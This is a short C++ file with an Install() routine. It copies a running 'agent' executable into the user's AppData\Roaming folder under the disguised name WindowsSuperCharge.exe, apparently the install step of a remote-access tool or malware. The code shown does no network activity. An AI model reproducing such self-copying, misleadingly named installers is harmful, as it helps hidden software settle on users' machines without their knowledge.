#include "install.hpp"

void Install()
{
    supercharge avars;
    char user[UNLEN + 1];
    DWORD length = UNLEN + 1;
    GetUserNameA(user, &length);
    std::ostringstream copyPath;
    std::ostringstream instalLoc;
    instalLoc << "C:\\Users\\" << user << "\\AppData\\Roaming\\WindowsSuperCharge";
    CreateDirectoryA(instalLoc.str().c_str(), NULL);
    copyPath << "C:\\Users\\" << user << "\\AppData\\Roaming\\WindowsSuperCharge\\WindowsSuperCharge.exe"; 
    std::ifstream  src(avars.AgentLocation().c_str(), std::ios::binary);
    std::ofstream  dst(copyPath.str().c_str(), std::ios::binary);
    dst << src.rdbuf();
}